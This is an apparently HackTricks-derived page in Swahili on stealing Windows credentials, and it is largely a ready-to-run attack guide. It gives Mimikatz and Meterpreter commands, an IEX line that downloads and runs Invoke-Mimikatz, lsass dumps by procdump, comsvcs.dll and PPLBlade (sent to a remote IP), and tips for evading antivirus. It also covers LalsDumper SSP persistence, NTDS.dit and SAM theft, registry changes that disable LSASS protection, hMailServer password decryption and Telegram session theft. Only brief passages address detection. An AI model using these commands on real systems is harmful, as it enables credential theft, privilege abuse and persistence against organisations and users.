# Kuiba Vitambulisho vya Windows

{{#include ../../banners/hacktricks-training.md}}

## Vitambulisho vya Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Pata mambo mengine ambayo Mimikatz inaweza kufanya katika** [**ukurasa huu**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Jifunze kuhusu baadhi ya kinga zinazowezekana za credentials hapa.**](credentials-protections.md) **Kinga hizi zinaweza kuzuia Mimikatz kutoa baadhi ya credentials.**

## Credentials with Meterpreter

Tumia [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **niliyoitengeneza ili** kutafuta **nywila na hashes** ndani ya mwathiriwa.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Kukwepa AV

### Procdump + Mimikatz

Kwa kuwa **Procdump kutoka** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ni zana halali ya Microsoft**, Defender haiitambui.\
Unaweza kutumia zana hii **kudump mchakato wa lsass**, **kupakua dump** na **kutoa** **credentials ndani ya kifaa** kutoka kwenye dump.

Unaweza pia kutumia [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Mchakato huu hufanywa kiotomatiki kwa kutumia [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Kumbuka**: Baadhi ya **AV** zinaweza **kutambua** matumizi ya **procdump.exe ku-dump lsass.exe** kuwa **hasidi**; hii ni kwa sababu **zinatambua** mifuatano **"procdump.exe" na "lsass.exe"**. Kwa hivyo, ni **vigumu zaidi kugundulika** ikiwa **utapitisha** **PID** ya lsass.exe kama **argument** kwa procdump **badala ya** **jina lsass.exe.**

### Dumping lsass kwa kutumia **comsvcs.dll**

DLL inayoitwa **comsvcs.dll**, inayopatikana katika `C:\Windows\System32`, inahusika na **ku-dump kumbukumbu ya mchakato** iwapo mfumo uta-crash. DLL hii ina **function** inayoitwa **`MiniDumpW`**, iliyoundwa kuitwa kwa kutumia `rundll32.exe`.\
Kutumia argument mbili za kwanza si muhimu, lakini ya tatu imegawanywa katika sehemu tatu. Kitambulisho cha mchakato (PID) wa ku-dump ni sehemu ya kwanza, eneo la faili ya dump ni sehemu ya pili, na sehemu ya tatu lazima iwe neno **full**. Hakuna chaguo mbadala.\
Baada ya kuchanganua sehemu hizi tatu, DLL huanza kuunda faili ya dump na kuhamisha kumbukumbu ya mchakato uliobainishwa kwenye faili hiyo.\
Inawezekana kutumia **comsvcs.dll** ku-dump mchakato wa lsass, hivyo kuondoa hitaji la kupakia na kutekeleza procdump. Njia hii imefafanuliwa kwa kina katika [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Amri ifuatayo hutumika kutekeleza:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Unaweza kuendesha mchakato huu kiotomatiki kwa kutumia** [**lsassy**](https://github.com/Hackndo/lsassy)**.**

### **Kutupa lsass kwa kutumia Task Manager**

1. Bofya kulia kwenye Task Bar kisha ubofye Task Manager
2. Bofya More details
3. Tafuta mchakato wa "Local Security Authority Process" kwenye kichupo cha Processes
4. Bofya kulia kwenye mchakato wa "Local Security Authority Process" kisha ubofye "Create dump file".

### Kutupa lsass kwa kutumia procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ni binary iliyosainiwa na Microsoft na ni sehemu ya suite ya [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Crash dump kamili ya mfumo iliyopo tayari, au nakala iliyobanwa iliyo kwenye folda ya mtumiaji inayoweza kufikiwa, huenda ikahifadhi taarifa za credentials kwa uchanganuzi wa nje ya mtandao. Majina ya faili kama `MEMORY.DMP` na `MEMORY.7z` ni vidokezo vya kuanzia ukaguzi tu: thibitisha chanzo na ufikiaji wake, na usidhani kuwa zina credentials zinazoweza kutumika au zilizo za sasa.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Kudump lsass kwa PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni Protected Process Dumper Tool inayotumia obfuscation kwenye memory dump na kuihamisha hadi kwenye workstations za mbali bila kuihifadhi kwenye diski.

**Utendaji mkuu**:

1. Kupita ulinzi wa PPL
2. Kutumia obfuscation kwenye faili za memory dump ili kukwepa mbinu za Defender za kugundua kwa kutumia signature
3. Kupakia memory dump kwa kutumia mbinu za upakiaji za RAW na SMB bila kuihifadhi kwenye diski (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – Dumping ya LSASS inayotumia SSP bila MiniDumpWriteDump

Ink Dragon hutumia dumper ya hatua tatu inayoitwa **LalsDumper**, ambayo haiiti kamwe `MiniDumpWriteDump`, kwa hiyo EDR hooks za API hiyo haziwashi:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – hutafuta ndani ya `fdp.dll` placeholder yenye herufi ndogo `d` 32, huiandika upya kwa kutumia absolute path ya `rtu.txt`, huhifadhi DLL iliyorekebishwa kama `nfdp.dll`, kisha huita `AddSecurityPackageA("nfdp","fdp")`. Hii hulazimisha **LSASS** kupakia DLL hasidi kama Security Support Provider (SSP) mpya.
2. **Stage 2 ndani ya LSASS** – LSASS inapopakia `nfdp.dll`, DLL husoma `rtu.txt`, hufanya XOR kwa kila byte kwa kutumia `0x20`, na kupangia blob iliyofasiriwa kwenye memory kabla ya kuhamisha utekelezaji.
3. **Stage 3 dumper** – payload iliyopangiwa memory hutekeleza upya mantiki ya MiniDump kwa kutumia **direct syscalls** zinazotatuliwa kutoka kwa majina ya API yaliyohashishwa (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Export maalum inayoitwa `Tom` hufungua `%TEMP%\<pid>.ddt`, hutiririsha dump iliyobanwa ya LSASS kwenye faili, na kufunga handle ili exfiltration iweze kufanyika baadaye.

Maelezo ya operator:

* Weka `lals.exe`, `fdp.dll`, `nfdp.dll`, na `rtu.txt` kwenye directory moja. Stage 1 hubadilisha placeholder iliyowekwa hard-code na absolute path ya `rtu.txt`, kwa hiyo kuziweka sehemu tofauti huvunja mnyororo.
* Usajili hufanyika kwa kuongeza `nfdp` kwenye `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Unaweza kuweka thamani hiyo mwenyewe ili LSASS ipakie tena SSP kila inapowashwa.
* Faili za `%TEMP%\*.ddt` ni dumps zilizobanwa. Zifungue locally, kisha uzitumie kwenye Mimikatz/Volatility kwa ajili ya credential extraction.
* Kuendesha `lals.exe` kunahitaji haki za admin/SeTcb ili `AddSecurityPackageA` ifanikiwe; mara tu wito huo unapokamilika, LSASS hupakia SSP hasidi na kutekeleza Stage 2 bila kuonyesha hilo.
* Kuondoa DLL kwenye disk hakuiondoi kutoka LSASS. Futa ingizo la registry kisha uwashe upya LSASS (reboot), au iache ili kudumisha persistence ya muda mrefu.

## CrackMapExec

### Dump hashes za SAM

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Kudump siri za LSA

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump ya NTDS.dit kutoka kwa DC lengwa

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump historia ya nywila ya NTDS.dit kutoka kwa DC lengwa

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Onyesha sifa ya pwdLastSet kwa kila akaunti ya NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Kuiba SAM & SYSTEM

Faili hizi zinapaswa **kupatikana** katika _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM._ Lakini **huwezi kuzinakili tu kwa njia ya kawaida** kwa sababu zimelindwa.

### Kutoka kwenye Registry

Njia rahisi zaidi ya kuiba faili hizo ni kupata nakala kutoka kwenye registry:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Pakua** faili hizo kwenye mashine yako ya Kali na **toa hash** ukitumia:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Unaweza kunakili faili zilizolindwa kwa kutumia huduma hii. Unahitaji kuwa Administrator.

#### Using vssadmin

Binary ya vssadmin inapatikana tu katika matoleo ya Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Lakini unaweza kufanya vivyo hivyo kutoka **Powershell**. Huu ni mfano wa **jinsi ya kunakili faili la SAM** (diski kuu inayotumika ni "C:" na imehifadhiwa kwenye C:\users\Public), lakini unaweza kutumia hii kunakili faili yoyote iliyolindwa:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Msimbo kutoka kwenye kitabu: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Hatimaye, unaweza pia kutumia [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kutengeneza nakala za SAM, SYSTEM na ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Sifa za Active Directory - NTDS.dit**

Faili ya **NTDS.dit** inajulikana kama kiini cha **Active Directory**, ikiwa na data muhimu kuhusu objects za watumiaji, vikundi na uanachama wao. Hapa ndipo **password hashes** za watumiaji wa domain huhifadhiwa. Faili hii ni hifadhidata ya **Extensible Storage Engine (ESE)** na iko katika **_%SystemRoom%/NTDS/ntds.dit_**.

Katika hifadhidata hii, kuna majedwali matatu makuu:

- **Data Table**: Jedwali hili huhifadhi maelezo kuhusu objects kama vile watumiaji na vikundi.
- **Link Table**: Hufuatilia mahusiano, kama vile uanachama wa vikundi.
- **SD Table**: **Security descriptors** za kila object huhifadhiwa hapa, ili kuhakikisha usalama na udhibiti wa ufikiaji wa objects zilizohifadhiwa.

Utafiti wa Christoffer Andersson kuhusu safu ya hifadhidata unaeleza majedwali haya na tabia zake zinazotegemea toleo kwa undani zaidi.<sup>[[8]](#references)</sup>

Windows hutumia _Ntdsa.dll_ kuingiliana na faili hiyo, na _lsass.exe_ huitumia. Kwa hiyo, **sehemu** ya faili ya **NTDS.dit** inaweza kupatikana **ndani ya kumbukumbu ya `lsass`** (huenda data iliyofikiwa hivi karibuni ikapatikana humo kwa sababu ya uboreshaji wa utendaji unaotumia **cache**).

#### Kusimbua hashes zilizo ndani ya NTDS.dit

Hash husimbwa mara tatu:

1. Simbua Password Encryption Key (**PEK**) kwa kutumia **BOOTKEY** na **RC4**.
2. Simbua **hash** kwa kutumia **PEK** na **RC4**.
3. Simbua **hash** kwa kutumia **DES**.

**PEK** ina **thamani ileile kwenye kila domain controller**, lakini **imesimbwa** ndani ya **NTDS.dit** kwa kutumia **BOOTKEY** mahususi ya DC kutoka kwenye hive ya **SYSTEM** ya domain controller huyo. Kwa hiyo, kutoa credentials kunahitaji **NTDS.dit** na **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Kunakili NTDS.dit kwa kutumia Ntdsutil

Inapatikana tangu Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Unaweza pia kutumia mbinu ya [**volume shadow copy**](#stealing-sam-and-system) kunakili faili la **ntds.dit**. Kumbuka kwamba utahitaji pia nakala ya **SYSTEM file** (tena, tumia mbinu ya [**kulidump kutoka kwenye registry au kutumia volume shadow copy**](#stealing-sam-and-system)).

### **Kutoa hashes kutoka NTDS.dit**

Baada ya **kupata** faili **NTDS.dit** na **SYSTEM**, unaweza kutumia zana kama _secretsdump.py_ **kutoa hashes**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Unaweza pia **kuzichota kiotomatiki** kwa kutumia mtumiaji halali wa domain admin:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Kwa **faili kubwa za NTDS.dit**, inapendekezwa kuzitoa kwa kutumia [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Hatimaye, unaweza pia kutumia **moduli ya metasploit**: _post/windows/gather/credentials/domain_hashdump_ au **mimikatz** `lsadump::lsa /inject`

### **Kutoa objekti za domain kutoka NTDS.dit hadi kwenye hifadhidata ya SQLite**

Objekti za NTDS zinaweza kutolewa hadi kwenye hifadhidata ya SQLite kwa kutumia [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Sio siri pekee zinazotolewa, bali pia objekti zote na sifa zake ili kupata maelezo zaidi wakati faili ghafi ya NTDS.dit tayari imepatikana.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Hive ya `SYSTEM` ni ya hiari lakini huruhusu usimbuaji wa secrets (hashes za NT na LM, credentials za ziada kama nywila za maandishi wazi, funguo za kerberos au trust, na historia za nywila za NT na LM). Pamoja na taarifa nyingine, data ifuatayo hutolewa: akaunti za watumiaji na mashine pamoja na hashes zake, flags za UAC, timestamp ya kuingia mara ya mwisho na kubadilisha nywila, maelezo ya akaunti, majina, UPN, SPN, groups na memberships za kujirudia, mti na membership za organizational units, na trusted domains pamoja na aina, mwelekeo na attributes za trusts...

## Lazagne

Pakua binary kutoka [hapa](https://github.com/AlessandroZ/LaZagne/releases). Unaweza kutumia binary hii kutoa credentials kutoka kwa programu mbalimbali.

```
lazagne.exe all
```

## Zana nyingine za kutoa credentials kutoka SAM na LSASS

### Windows credentials Editor (WCE)

Zana hii inaweza kutumika kutoa credentials kutoka kwenye kumbukumbu. Ipakue kutoka: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Toa credentials kutoka kwenye faili la SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Toa taarifa za uthibitishaji kutoka kwenye faili la SAMેણ

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Pakua kutoka:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7), kisha **iendeshe** tu na nywila zitatolewa.

## Kuchimba data kutoka kwenye vipindi vya RDP visivyotumika na kudhoofisha vidhibiti vya usalama

FinalDraft RAT ya Ink Dragon inajumuisha tasker ya `DumpRDPHistory` yenye mbinu zinazofaa kwa red-teamer yeyote:<sup>[[3]](#references)</sup>

### Ukusanyaji wa telemetry kwa mtindo wa DumpRDPHistory

* **Malengo ya RDP ya kutoka** – changanua kila hive ya mtumiaji kwenye `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Kila subkey huhifadhi jina la server, `UsernameHint`, na timestamp ya mabadiliko ya mwisho. Unaweza kuiga mantiki ya FinalDraft kwa kutumia PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Ushahidi wa RDP inayoingia** – uliza logi ya `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` kuhusu Event IDs **21** (kuingia kumefanikiwa) na **25** (kuondoa muunganisho) ili kubaini ni nani aliyesimamia mashine:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Mara tu unapojua ni Domain Admin gani huunganisha mara kwa mara, dump LSASS (kwa LalsDumper/Mimikatz) wakati session yake **iliyokatishwa muunganisho** bado ipo. CredSSP + NTLM fallback huacha verifier na tokens zake kwenye LSASS, ambazo zinaweza kutumika tena kupitia SMB/WinRM ili kupata `NTDS.dit` au kuweka persistence kwenye domain controllers.

### Registry downgrades zinazolengwa na FinalDraft

Implant hiyo hiyo pia hubadilisha funguo kadhaa za registry ili kurahisisha wizi wa credentials:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* Kuweka `DisableRestrictedAdmin=1` hulazimisha matumizi kamili ya credentials/ticket wakati wa RDP, na kuwezesha pivots za mtindo wa pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` huzima uchujaji wa tokeni za UAC ili local admins wapate tokeni zisizo na vizuizi kupitia mtandao.
* `DSRMAdminLogonBehavior=2` humruhusu msimamizi wa DSRM kuingia wakati DC iko mtandaoni, na kuwapa washambuliaji akaunti nyingine ya ndani yenye ruhusa za juu.
* `RunAsPPL=0` huondoa ulinzi wa LSASS PPL, na kufanya ufikiaji wa kumbukumbu kuwa rahisi kwa dumpers kama LalsDumper.

## Credentials za usanidi wa hMailServer (baada ya compromise)

Kagua faili halisi za usanidi `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, na `C:\ProgramData\hMailServer\hMailServer.ini` kulingana na mpangilio wa usakinishaji. Thamani inayosomeka na isiyo tupu ya `[Security] AdministratorPassword=` ni hash ya nenosiri la usimamizi wa hMailServer; si ushahidi wa nenosiri la Windows Administrator. Ikiwa credential hiyo itapatikana, pivot yoyote kwenda kwenye akaunti ya Windows inahitaji uthibitisho huru wa matumizi tena ya nenosiri na ruhusa za kuingia.

Kwa usakinishaji unaotumia database ya SQL CE, thamani tofauti ya `[Database] Password=` katika INI hulinda database. Katika usakinishaji wa zamani, thamani hii husimbwa kwa Blowfish kwa kutumia ufunguo tuli `THIS_KEY_IS_NOT_SECRET` na ubadilishaji wa endianness wa maneno ya baiti 4. Tumia mfuatano wa hex kutoka kwenye INI pamoja na kipande hiki cha Python:<sup>[[2]](#references)</sup>

Kwanza thibitisha kuwa akaunti ya sasa inaweza kusoma **zote mbili** INI na database husika ya SQL CE `.sdf`. Nenosiri la INI hulinda database; ni tofauti na hash za akaunti za mailbox zilizohifadhiwa ndani yake. Kagua au boresha **nakala** ya database inayotumika, kamwe usitumie faili halisi ya moja kwa moja.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Ukiwa na password iliyo wazi, nakili database ya SQL CE ili kuepuka kufungwa kwa faili, pakia provider ya 32-bit, na uiboreshe ikihitajika kabla ya kuuliza hashes:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Safu wima ya `accountpassword` hutumia umbizo la hash la hMailServer (hashcat mode `1421`). Nenosiri la mailbox lililovunjwa huwa njia ya kuingia kwenye akaunti ya Windows ikiwa tu nenosiri hilo linatumiwa tena na akaunti ya local/domain, na akaunti hiyo ina ruhusa zinazohitajika za kuingia kwa mbali.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Baadhi ya zana hunasa **manenosiri ya logon ya plaintext** kwa kuingilia callback ya LSA logon `LsaApLogonUserEx2`. Wazo ni kuweka hook au wrapper kwenye callback ya authentication package ili kunasa credentials **wakati wa logon** (kabla ya hashing), kisha kuzihifadhi kwenye diski au kumrejeshea operator. Kwa kawaida, hili hutekelezwa kupitia helper inayoingiza msimbo kwenye LSA au kujisajili nayo, kisha kurekodi kila tukio la mafanikio la interactive/network logon pamoja na username, domain na nenosiri.<sup>[[1]](#references)</sup>

Maelezo ya kiutendaji:
- Inahitaji local admin/SYSTEM ili kupakia helper kwenye njia ya authentication.
- Credentials zilizonaswa huonekana tu logon inapotokea (interactive, RDP, service au network logon, kutegemea hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) huhifadhi taarifa za muunganisho zilizohifadhiwa kwenye faili ya `sqlstudio.bin` ya kila mtumiaji. Zana maalum za dump zinaweza kuchanganua faili hiyo na kurejesha credentials za SQL zilizohifadhiwa. Kwenye shell zinazorejesha tu matokeo ya amri, faili hiyo mara nyingi hutolewa kwa kuisimba kama Base64 na kuichapisha kwenye stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Kwa upande wa operator, jenga upya faili na uendeshe dumper kwenye mfumo wa ndani ili kurejesha credentials:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Wizi wa session za kivinjari na cookies kupitia Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Wizi wa session ya Telegram Desktop `tdata`

Telegram Desktop huhifadhi hali ya uidhinishaji na akaunti kwenye directory yake ya **`tdata`**. Session iliyonakiliwa inaweza kupakiwa kwa tooling inayoendana nayo ili kuingia bila nenosiri la akaunti, mradi uidhinishaji huo bado ni halali; ikiwa usimbaji fiche wa data ya ndani umewashwa, stealer pia huhitaji passcode. Kisha session iliyoidhinishwa inaweza kufichua data ya utambulisho, metadata ya mazungumzo na uanachama, ujumbe na media inayoweza kupakuliwa.<sup>[[10]](#references)</sup>

### Ugunduzi na upatikanaji

Tafuta kwenye mipangilio ya kawaida na inayobebeka; majina ya package za Microsoft Store hutofautiana, kwa hivyo orodhesha directory za package zenye `TelegramMessenge` na ukague subtree yake ya `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Ikiwa usomaji wa kawaida hautafaulu na token ya mchakato **tayari ina** `SeBackupPrivilege` **na imeiwezesha**, ufikiaji unaozingatia backup hutoa njia mbadala; haupati privilege hiyo wala kuinua ruhusa za mchakato. `CreateFileW` yenye `FILE_FLAG_BACKUP_SEMANTICS` inaweza kuomba semantiki za backup/restore na kupuuza ukaguzi wa usalama wa faili ikiwa token ina privileges zinazohitajika, lakini flag hiyo peke yake haiwezi kushinda lock ya kushiriki isiyooana.<sup>[[10]](#references)[[11]](#references)</sup>

Kwa faili zilizofungwa zinazotumika, tengeneza/soma **Volume Shadow Copy**; kwa faili zilizozuiwa na ACL, `robocopy /B` hutumia hali ya backup na kupuuza ACL za faili na saraka.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Implant inayozingatia matumizi ya bandwidth inaweza kutuma kwanza orodha ya njia za faili pekee, kupokea kitambulisho cha snapshot pamoja na njia ambazo C2 tayari imehifadhi, kisha kupakia faili zinazokosekana pekee. Kwa hiyo, uhamishaji mdogo wa nyongeza baada ya kuorodhesha `tdata` kwa kurudia unaweza bado kuashiria wizi uliofanikiwa wa session.<sup>[[10]](#references)</sup>

### Utambuzi na kudhibiti hali

Linganisha ufikiaji wa kurudia wa `tdata` unaofanywa na mchakato usio wa Telegram na kuwezeshwa kwa `SeBackupPrivilege`, ufunguzi wa faili unaotumia backup semantics, shughuli za VSS, au mchakato mtoto wa `robocopy.exe` unaotumia `/B`. Pia tafuta kuorodheshwa kwa haraka kwa `%APPDATA%` na `%LOCALAPPDATA%\Packages`, kukifuatiwa na miunganisho ya nje kutoka kwa mchakato huohuo. Baada ya kuvamiwa, tumia **Settings → Devices** (au **Privacy & Security → Active Sessions**) kusitisha session zisizotambulika; kuwezesha uthibitishaji wa hatua mbili pekee hakubatilishi authorization ambayo tayari imeibwa.<sup>[[10]](#references)[[13]](#references)</sup>

## Wizi wa credentials za Passkeys / WebAuthn kutoka Chrome kwenye Windows

Ikiwa utekelezaji wa code utapatikana kama **mtumiaji lengwa** kwenye host ya Windows inayotumia **Chrome + passkeys zilizosawazishwa na Google Password Manager**, passkeys huwa shabaha ya kuvutia baada ya unyonyaji, hata **bila admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Artifacts za ndani zinazovutia

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** huhifadhi rekodi za **`WebauthnCredentialSpecifics`** zilizosimbwa kwa protobuf. Mchakato unaoendeshwa na mtumiaji huyo huyo unaweza kuorodhesha **RP ID**, **username**, **credential ID**, na data ya ufunguo binafsi iliyosimbwa kwa passkeys zilizosawazishwa.<sup>[[5]](#references)</sup>
